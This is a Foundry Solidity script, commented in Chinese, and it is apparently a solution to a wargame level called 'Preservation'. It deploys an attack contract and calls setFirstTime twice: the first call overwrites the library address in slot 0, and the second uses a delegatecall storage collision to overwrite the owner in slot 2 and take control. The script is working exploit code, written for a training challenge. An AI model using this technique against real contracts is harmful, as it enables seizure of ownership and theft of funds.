// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/PreservationAttack.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
    function timeZone1Library() external view returns (address);
}

contract ExploitPreservation is Script {
    // 填入你的實例地址
    address payable target = payable(vm.envAddress("INSTANCE_ADDRESS"));

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address myAddress = vm.addr(deployerPrivateKey);

        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署攻擊合約
        AttackPreservation attack = new AttackPreservation();
        console.log("Attack contract deployed at:", address(attack));

        IPreservation preservation = IPreservation(target);

        // 2. 第一步：將 Preservation 的 Slot 0 (timeZone1Library) 
        // 改為我們的攻擊合約地址
        // 注意：要把 address 轉成 uint256
        console.log("Current Library:", preservation.timeZone1Library());
        preservation.setFirstTime(uint256(uint160(address(attack))));
        console.log("New Library (should be attack contract):", preservation.timeZone1Library());

        // 3. 第二步：再次呼叫 setFirstTime
        // 此時 Preservation 會 delegatecall 到我們的攻擊合約
        // 我們傳入自己的地址作為參數來覆蓋 Slot 2 (owner)
        preservation.setFirstTime(uint256(uint160(myAddress)));

        console.log("New Owner:", preservation.owner());
        require(preservation.owner() == myAddress, "Exploit failed!");

        vm.stopBroadcast();
    }
}
